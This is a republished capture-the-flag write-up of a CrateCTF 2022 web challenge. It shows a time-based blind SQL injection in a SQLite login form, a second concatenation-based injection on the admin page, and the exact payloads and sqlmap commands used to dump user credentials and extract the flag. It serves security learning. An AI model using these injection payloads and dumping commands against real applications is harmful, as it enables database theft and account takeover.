# :game_die: CrateCTF 2022 | Web (Adguard 2000) - Blind Time-Based SQL Injection

> **Original Source:** [CrateCTF 2022 | Web (Adguard 2000) - Blind Time-Based SQL Injection](https://infosecwriteups.com/cratectf-2022-blind-time-based-sql-injection-b4a39fe50dcc)
> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2022

---

# CrateCTF 2022 | Web (Adguard 2000) — Blind Time-Based SQL Injection


Hello, today i’m going to write about the challenge i’ve solved with my colleagues at CrateCTF 2022 last weekend.


The challenge was a vulnerable login web page (/login.php):


So first thing you would think about is SQL Injection. I tried to inject the single quote in both of the fields (username and password) then i figured out that password field is the one which is vulnerable to SQL Injection after Igot this error:


I used SQLMap tool directely just to try if i can exploit it automatically with this amazing tool and that was the result:


Here we go baby!! 😍


It’s Time-Based Blind SQL Injection in SQLite DBMS (heavy query) with the payload:

>

‘ OR 2839=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) — YUVx


Let’s dump the tables with *— tables* option:


Here we go! 😭


## Get Abdelkader Belcaid’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


After that i dumped users table (The command was *$sqlmap -r payload.txt -T users — dump — time-sec=10*), Then i dumped columns of users table (The command was *$sqlmap -r payload.txt -T users -C username,password — dump — time-sec=10*):


I logged in as admin by using admin creds (admin/UniversalGod):


*/manage.php (admin dashboard page)*


After long test with my colleagues we doubt that the url input is vulnerable to SSRF because my friend received a callback, but i didn’t! But after a while I figured out that wasn’t SSRF but the parameters are vulnerable to another SQL Injection after we tested this payload:

>

a’ || hahaha || ‘b


Let’s exploit it!😁👊🏽


We used this payload to dump the 69th secret’s id from secrets table because we know that flag is stored in secrets table:

>

a’ || (SELECT secret FROM secrets where id = 69) || ‘b


And that was the result:

>

aIf it’s true that we are here to help others, then what exactly are the others here for?b


I been thinking about a smart way how we can extract the flag directely cause there were 151 lines stored in secrets table and it will take long time to extract them all in order to read the flag.


Since the flag format is “*cratectf” *I just thought about to use LIKE which will help us to extract any line contains the flag format that way we can easily extarct the flag. And finally here is the payload we used to extract the flag:

>

*a’ || (SELECT secret FROM secrets WHERE secret LIKE “%cratectf%” ) || ‘bBoom!!! *😈

>

aWhat is appropriate to yell after pwning? cratectf{use_sql_statements_for_injections_not_bleach}b


Our colleague improves the exploitation by SQLMap and make it faster and more accurate:

>

*sqlmap — code=302 -u *[http://challs.crate.nu:26723/login.php](http://challs.crate.nu:26723/login.php)* — data ‘username=larry&password=yiffy*&button=Login’ — user-agent=”Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" — level=5 — risk=3 — dbms sqlite — tech=B -A “hello” — threads=10 — sql-query “SELECT * FROM secrets WHERE secret like ‘%cratectf%’”*


The result:


It was actually a fun challenge, I’ve learned such an interesting stuff like this and had fun with the guys. Shoutout to all ChaGuCTF Team members for this Saturday and CrateCTF 2022 organizers for this fun CTF.


Thanks

---

*Originally published on [Medium](https://infosecwriteups.com/cratectf-2022-blind-time-based-sql-injection-b4a39fe50dcc). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
